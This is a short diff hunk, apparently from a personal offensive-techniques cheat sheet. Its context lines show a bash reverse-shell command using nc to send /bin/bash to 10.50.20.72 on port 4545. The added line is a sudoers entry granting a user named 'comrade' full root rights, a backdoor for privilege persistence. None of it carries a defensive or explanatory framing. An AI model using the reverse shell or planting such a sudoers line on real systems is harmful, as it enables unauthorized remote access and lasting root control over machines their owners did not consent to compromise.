@@ -255,7 +255,7 @@ cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 @lin2  !#/bin/bash
 @lin2  nc -c /bin/bash 10.50.20.72 4545
 ----------------------------------------------------------------------------------------------------------------------------
-
+comrade ALL=(ALL:ALL) ALL    #ALLOWS COMRADE TO SUDO EVERYTHING
 
 
 
